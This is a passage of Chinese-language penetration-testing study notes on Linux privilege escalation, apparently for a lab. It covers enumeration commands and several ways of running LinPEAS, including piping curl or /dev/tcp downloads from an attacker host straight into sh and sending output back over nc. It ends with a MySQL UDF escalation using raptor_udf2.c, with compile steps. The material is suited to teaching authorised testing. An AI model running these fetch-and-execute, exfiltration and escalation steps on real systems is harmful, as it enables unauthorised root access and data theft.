<td>*<em>控制终端，</em>***?**表示没有终端（后台进程）</td>
</tr>
<tr>
<td><strong>TPGID</strong></td>
<td><strong>终端前台进程组 ID，****-1</strong>表示没有终端</td>
</tr>
<tr>
<td><strong>STAT</strong></td>
<td><strong>进程状态，如</strong><code>S</code>（睡眠）、<code>R</code>（运行）、<code>Z</code>（僵尸）等</td>
</tr>
<tr>
<td><strong>UID</strong></td>
<td><strong>运行该进程的用户 ID</strong></td>
</tr>
<tr>
<td><strong>TIME</strong></td>
<td><strong>累计占用的 CPU 时间</strong></td>
</tr>
<tr>
<td><strong>COMMAND</strong></td>
<td><strong>启动命令（包含参数，树形缩进显示父子关系）</strong></td>
</tr>
</tbody></table>
<ul>
<li><code>top -n 1</code>：实时进程信息。</li>
</ul>
</li>
</ul>
<h4 id="2-3-枚举网络和挂载"><a href="#2-3-枚举网络和挂载" class="headerlink" title="2.3 枚举网络和挂载"></a>2.3 枚举网络和挂载</h4><p><strong>知道进程后的使用</strong></p>
<ul>
<li><p><strong>网络连接</strong>：</p>
<ul>
<li><code>netstat -a</code> （-at是TCP  -au是UDP）或 <code>netstat -ano</code>（all**    <strong>不解析名称</strong>    **计时器timer）：显示所有网络连接和端口。</li>
</ul>
<p><img src="/images/image-20251125193909901.png?lastModify=1766751620" alt="image-20251125193909901"><br><img src="/images/image-20251124215958644.png?lastModify=1766751620" alt="image-20251124215958644"><br><img src="/images/image-20251124220043378.png?lastModify=1766751620" alt="image-20251124220043378"><br><code>netstat -l</code>：正在监听的端口<br><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251124220117965.png?lastModify=1766751620" alt="image-20251124220117965"></p>
</li>
<li><p><strong>挂载信息</strong>：</p>
<ul>
<li><code>cat /etc/fstab</code>：检测未挂载的硬盘和配置。（运维人员做快照&#x2F;备份时，会用另一块磁盘临时挂载上，运行后就“未挂载状态”。里面可能存在运维人员使用的备份，或敏感信息）</li>
</ul>
</li>
</ul>
<h4 id="2-4-枚举当前用户权限"><a href="#2-4-枚举当前用户权限" class="headerlink" title="2.4 枚举当前用户权限"></a>2.4 枚举当前用户权限</h4><ul>
<li><code>sudo -l</code>查看当前用户有哪些以root身份执行的 <strong>（非常重要）</strong></li>
</ul>
<blockquote>
<p><strong>比如这里列出了mysql是可以无需密码的利用root权限执行的</strong></p>
</blockquote>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251124212531732.png?lastModify=1766751620" alt="image-20251124212531732"></p>
<ul>
<li><p><strong>capabilities</strong></p>
<ul>
<li><code>getcap -r / 2&gt;/dev/null</code>    <strong>查看“得到权限能力”根目录下的所有文件</strong></li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251124213251483.png?lastModify=1766751620" alt="image-20251124213251483"></p>
</li>
</ul>
<hr>
<h3 id="3-自动化枚举工具"><a href="#3-自动化枚举工具" class="headerlink" title="3. 自动化枚举工具"></a>3. 自动化枚举工具</h3><p><strong>优点：简单，速度快，信息全</strong>	<strong>不足：需要搬运文件，会产生流量或流量特征；结果很长冗余；难以针对化（如果对各段了解不深入）</strong></p>
<p><strong>自动化工具可以快速扫描系统，发现潜在的提权漏洞。</strong></p>
<p><strong>要看目标机器上豆安装了什么应用；系统版本…可能设有关键词屏蔽，一个不行另一个</strong></p>
<ul>
<li><p><strong>PEASS-ng（linpeas.sh）</strong>：（最新，最常用，支持MAC OS &#x2F;Linux &#x2F;Windows）**	**一般四五分钟，十分钟之内<br><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125195605364.png?lastModify=1766751620" alt="image-20251125195605364"></p>
<ul>
<li><p><strong>功能强大，输出详细。</strong></p>
</li>
<li><p><strong>支持openSSL加密，和base64的加密，如果需要绕过，免杀会有一定的效果</strong></p>
</li>
<li><p><strong>使用方法：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4590" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment">#一般方法，会在本地留下文件和痕迹</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">wget</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">chmod</span> <span class="cm-operator">+</span>x linpeas.sh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">./linpeas.sh<span class="cm-tab" role="presentation" cm-text="    ">    </span><span class="cm-comment">#执行</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4591" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">curl</span> <span class="cm-attribute">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | <span class="cm-builtin">sh</span> </span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>扫描结果非常多，要具备手动枚举能力才能读懂</strong></p>
<blockquote>
<ul>
<li><strong>红&#x2F;黄</strong>：95% 概率是提权向量（RED 必看，Yellow 提醒）。</li>
<li><strong>浅青</strong>：拥有控制台登录权限的用户。</li>
<li><strong>蓝</strong>：无控制台用户 &amp; 已挂载设备。</li>
<li><strong>绿</strong>：常规项（用户、组、SUID&#x2F;SGID、挂载点、.sh 脚本、cron）。</li>
<li><strong>浅洋红</strong>：当前运行 LinPEAS 的用户名（你自己）。</li>
</ul>
</blockquote>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125200430660.png?lastModify=1766751620" alt="image-20251125200430660"></p>
<p><strong>假设靶机****不能联网</strong>，如何利用linpeas</p>
<p><strong>现在kali用python3开启web服务</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4612" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo python3 -m http.server 80</span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125201334255.png?lastModify=1766751620" alt="image-20251125201334255"><br>**    **靶机中</p>
<hr>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4616" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">curl</span> kaliip/linpeas.sh | <span class="cm-builtin">sh</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125201442699.png?lastModify=1766751620" alt="image-20251125201442699"></p>
<p><strong>将结果传回本地阅读（因为有的靶机阅读不一定方便，还要对结果进行分析）</strong></p>
<p><strong>kali</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4620" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> python3 <span class="cm-attribute">-m</span> http.server <span class="cm-number">80</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">nc</span> <span class="cm-attribute">-lvnp</span> <span class="cm-number">81</span> | <span class="cm-builtin">tee</span> linpeas.txt</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125201822766.png?lastModify=1766751620" alt="image-20251125201822766"></p>
<p><strong>靶机</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4623" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">curl</span> kaliip/linpeas.sh | <span class="cm-builtin">sh</span> | <span class="cm-builtin">nc</span> kaliip <span class="cm-number">81</span> </span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125201949936.png?lastModify=1766751620" alt="image-20251125201949936"></p>
<p>**这时，结果会显示在kali中，并且会把结果存入linpeas.txt（**<strong>tee命令的作用，既显示又存储</strong>）</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125202143325.png?lastModify=1766751620" alt="image-20251125202143325"></p>
<ul>
<li><p><strong>查看输出：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4630" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">less <span class="cm-attribute">-r</span> linpeas.txt<span class="cm-tab" role="presentation" cm-text="    "> </span><span class="cm-tab" role="presentation" cm-text="    ">    </span><span class="cm-comment">#vi阅读性特别差</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125202642868.png?lastModify=1766751620" alt="image-20251125202642868"></p>
<p><strong>-r  是让颜色、进度条、表格线等 ANSI 转义序列原样显示，而不是打成 ^[[31m 一堆乱码。</strong></p>
<p><strong>靶机中curl不能用的情况</strong></p>
<p><strong>kali</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4638" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">nc</span> <span class="cm-attribute">-lvnp</span> <span class="cm-number">80</span> < linpeas.sh<span class="cm-tab" role="presentation" cm-text="    ">   </span><span class="cm-comment">#将linpeas.sh重定向到80端口</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>nc -lvnp 80</code>：<ul>
<li><code>-l</code> 进入监听（listen）模式；</li>
<li><code>-v</code> 显示详细连接信息；</li>
<li><code>-n</code> 禁止 DNS 解析，加快响应；</li>
<li><code>-p 80</code> 指定本地端口为 80。</li>
</ul>
</li>
<li><code>&lt; linpeas.sh</code>：把文件内容重定向到 nc 的标准输入，<strong>一旦有客户端连接，就把整份脚本按字节推送出去</strong>。</li>
<li><strong>结果</strong> **攻击机 80 端口变成 ****“一次性文件服务器”**</li>
</ul>
<p><strong>靶机</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n4656" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">cat</span> < /dev/tcp/kaliip/80 | <span class="cm-builtin">sh</span><span class="cm-tab" role="presentation" cm-text="    ">   </span><span class="cm-comment">#利用 Bash 内置的 /dev/tcp 伪设备，把远程脚本直接拉进内存并通过管道交给 sh 解释执行，全程不落盘。</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125203359192.png?lastModify=1766751620" alt="image-20251125203359192"></p>
</li>
</ul>
</li>
</ul>
<p><strong>没有curl也可以在内存中执行</strong></p>
<ul>
<li><strong>LinEnum</strong>：<ul>
<li><strong>较早的工具，适用于****较老的系统</strong>，如果不支持linpeas，就选这个。</li>
</ul>
</li>
<li><strong>Linux-smart-enumeration</strong>：<ul>
<li><strong>智能枚举，根据系统环境调整。</strong></li>
</ul>
</li>
<li><strong>Linux-exploit-suggester</strong>：<ul>
<li><strong>根据内核版本和系统信息，提供可用的漏洞利用建议。</strong></li>
</ul>
</li>
<li><strong>Linuxprivchecker</strong>：<ul>
<li><strong>Python 编写</strong>，提供详细的权限检查。</li>
</ul>
</li>
<li><strong>unix-privesc-check</strong>：<ul>
<li><strong>适用于 Unix 和 Linux 系统。</strong></li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h3><h1 id="Linux提权精讲：演示1-服务漏洞利用提权，以MySQL-UDF提权为例"><a href="#Linux提权精讲：演示1-服务漏洞利用提权，以MySQL-UDF提权为例" class="headerlink" title="Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例"></a>Linux提权精讲：演示1 - 服务漏洞利用提权，以MySQL-UDF提权为例</h1><p><strong>Linux提权精讲，讲解并演示****服务漏洞利用</strong>提权，以MySQL-UDF（MySQL的用户自定义函数 user defined function）提权为例，涉及利用的前提条件、原理、利用过程等。</p>
<p><strong>MySQL-UDF（MySQL的用户自定义函数 user defined function）通过UDF用户可以对数据库进行自定义操作，满足特点业务需求，实现数据库本身不具有的功能。这是MySQL内置机制</strong></p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><h3 id="1-掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）"><a href="#1-掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）" class="headerlink" title="1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）"></a>1.掌握MySQL数据库的账号，有creat，insert，delete…以创建和使用函数（最好是root权限）</h3><p><strong>对应的场景：获得初始立足点之后，能够对内容管理系统的配置文件或应用程序的数据库连接的配置文件进行查看，能获得一个MySQL凭据。如果凭据有creat，insert，delete权限，可以考虑用户自定义函数UDF提权</strong></p>
<h3 id="2-MySQL数据库的secure-file-priv-权限基本一般必须为空-‘-‘（即默认设置或包含所需目录plugin）"><a href="#2-MySQL数据库的secure-file-priv-权限基本一般必须为空-‘-‘（即默认设置或包含所需目录plugin）" class="headerlink" title="2.MySQL数据库的secure_file_priv 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录plugin）"></a>2.MySQL数据库的<code>secure_file_priv</code> 权限基本一般必须为空 ‘ ‘（即默认设置或包含所需目录<code>plugin</code>）</h3><p>**这是一个MySQL系统变量，用于限制  **<code>load data // select into outfile // load_file( )</code>   这三种操作只能在特定目录下进行，以增强服务器的安全性</p>
<p>**如果非空，则 **<code>load data // select into outfile // load_file( )</code>   这三种操作只能在显示的目录下执行</p>
<p><strong>创建的函数要写到</strong><code>plugin</code>目录下</p>
<p><strong>如果为</strong><code>null</code>则禁止一切操作</p>
<h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><p><strong>从CMS配置文件获得的一个用户，如果权限比较大想到UDF提权</strong></p>
<p>**准备利用文件 **<code>searchsploit mysql udf</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125210816014.png?lastModify=1766751620" alt="image-20251125210816014"></p>
<p><strong>UDF的利用比较标准化，具体用哪个文件，不过是多尝试几次</strong></p>
<h3 id="1518-c-又叫-raptor-udf2-c利用文件提权演示"><a href="#1518-c-又叫-raptor-udf2-c利用文件提权演示" class="headerlink" title="1518.c  又叫 raptor_udf2.c利用文件提权演示"></a><code>1518.c</code>  又叫 <code>raptor_udf2.c</code>利用文件提权演示</h3><p>**下载 **<code>-m 1518.c</code>	<strong>这里的</strong><code>raptor_udf2.c</code>是同一个文件   raptor是脚本编写者自定，跟提权没有关系</p>
<p><strong>注释包含了利用方式，版本信息，如这里指定的编译命令</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125211458401.png?lastModify=1766751620" alt="image-20251125211458401"></p>
<p>**				**<img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125211356657.png?lastModify=1766751620" alt="image-20251125211356657"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4712" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">gcc -g -c raptor_udf2.c -fPIC</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<blockquote>
<h3 id="1-g"><a href="#1-g" class="headerlink" title="1. -g"></a>1. <code>-g</code></h3><ul>
<li><strong>作用</strong>：生成调试信息。</li>
<li><strong>解释</strong>：这个选项会告诉 GCC 在编译过程中，将额外的调试信息（比如变量名、函数名、源代码行号等）嵌入到生成的目标文件（<code>.o</code> 文件）中。</li>
<li><strong>用途</strong>：当你后续使用 GDB（GNU Debugger）等调试工具来调试这个程序时，这些信息是必不可少的。它让你能够在源代码层面单步执行、查看变量值等，极大地简化了调试过程。</li>
<li><strong>在漏洞利用场景中的意义</strong>：虽然最终的恶意 payload 通常不需要调试信息（会增加文件体积），但在开发和测试这个 <code>raptor_udf2.c</code> 漏洞利用代码时，<code>-g</code> 选项是至关重要的。它允许开发者跟踪代码执行流程，发现并修复漏洞利用过程中的问题。</li>
</ul>
<h3 id="2-c"><a href="#2-c" class="headerlink" title="2. -c"></a>2. <code>-c</code></h3><ul>
<li><strong>作用</strong>：只进行编译（Compile），不进行链接（Link）。</li>
<li><strong>解释</strong><br><strong>：C 语言程序的生成通常分为两个主要阶段：</strong><ol>
<li><strong>编译</strong>：将人类可读的 <code>.c</code> 源代码文件翻译成机器可读的<strong>汇编代码</strong>，然后再转换成<strong>目标文件</strong>（<code>.o</code> 文件）。目标文件包含了程序的二进制指令，但它还不是一个可以独立运行的程序。</li>
<li><strong>链接</strong>：将你的目标文件与程序所依赖的其他目标文件和库（Libraries，如 <code>libc</code>）链接在一起，最终生成一个<strong>可执行文件</strong>。</li>
</ol>
</li>
<li><strong>用途</strong>：使用 <code>-c</code> 选项可以让你只完成第一步。这在大型项目中很常见，可以将不同的源代码文件分别编译成目标文件，最后再统一进行链接，从而提高编译效率。在我们这个场景下，因为下一步我们要创建的是一个共享库（<code>.so</code> 文件），所以我们也需要先编译出 <code>.o</code> 文件。</li>
</ul>
<h3 id="3-raptor-udf2-c"><a href="#3-raptor-udf2-c" class="headerlink" title="3. raptor_udf2.c"></a>3. <code>raptor_udf2.c</code></h3><ul>
<li><strong>作用</strong>：这是你要编译的<strong>源代码文件</strong>。</li>
<li><strong>背景</strong>：<code>raptor_udf2.c</code> 是一个非常著名的针对 MySQL 用户自定义函数（UDF）的漏洞利用代码。它被设计用来编译成一个共享库（<code>.so</code> 文件），当这个恶意的 UDF 被加载到有漏洞的 MySQL 服务器中时，攻击者就可以执行任意系统命令，从而实现提权。这个文件名中的 “raptor” 是其作者或相关项目的名称。</li>
</ul>
<h3 id="4-fPIC"><a href="#4-fPIC" class="headerlink" title="4. -fPIC"></a>4. <code>-fPIC</code></h3><ul>
<li><strong>作用</strong>：生成<strong>位置无关代码（Position-Independent Code）</strong>。</li>
<li><strong>解释</strong><br><strong>：这是一个非常关键的选项，尤其是在创建共享库（Shared Library，</strong><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4751" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">.so</span></pre></div></div></div></div></div></div><div></div></div></div></pre></li>
</ul>
<p>**  文件）时。**</p>
<ul>
<li><strong>位置相关代码</strong>：代码中的地址是绝对的。如果操作系统将这个程序或库加载到内存中与预期不同的地址，程序就会崩溃。</li>
<li><strong>位置无关代码</strong>：代码中的地址是相对的。无论操作系统将这个共享库加载到内存的哪个位置，它都能正确运行。这是共享库的基本要求，因为多个程序可能同时使用同一个共享库，操作系统会为了效率将其加载到内存中的某个位置。</li>
<li><strong>在漏洞利用场景中的意义</strong>：因为我们最终要将编译出的 <code>.so</code> 文件作为一个共享库注入到 MySQL 进程中执行，所以必须使用 <code>-fPIC</code> 选项来确保它能被正确加载和运行，而不会因为地址问题导致 MySQL 服务崩溃。</li>
</ul>
</blockquote>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n4761" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">gcc -g -shared -Wl,-sonmae,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-g</code></td>
<td><strong>保留调试符号（gdb 可调式）</strong></td>
</tr>
<tr>
<td><code>-shared</code></td>
<td><strong>生成共享库</strong>（.so），不是可执行程序</td>
</tr>
<tr>
<td><code>-Wl,-soname,raptor_udf2.so</code></td>
<td><strong>把****内部 soname</strong>设为<code>raptor_udf2.so</code>，加载时 MySQL 按这个名字找文件</td>
</tr>
<tr>
<td><code>-o raptor_udf2.so</code></td>
<td><strong>输出文件名</strong></td>
</tr>
<tr>
<td><code>raptor_udf2.o</code></td>
<td><strong>已编译好的目标文件（源文件先</strong><code>gcc -c</code>生成）</td>
</tr>
<tr>
<td><code>-lc</code></td>
<td><strong>显式链接 libc（通常可省，写上也无害）</strong></td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125214331007.png?lastModify=1766751620" alt="image-20251125214331007"></p>
<p><strong>登录到MySQL数据库中，下面的步骤按照****Usage</strong>执行即可（注意<strong>路径</strong>是否需要更换）</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251125214403451.png?lastModify=1766751620" alt="image-20251125214403451"></p>
<p><strong>验证</strong><code>secure_file_priv</code>是否为空或是包含所用目录<code>plugin</code>，能UDF提权</p>
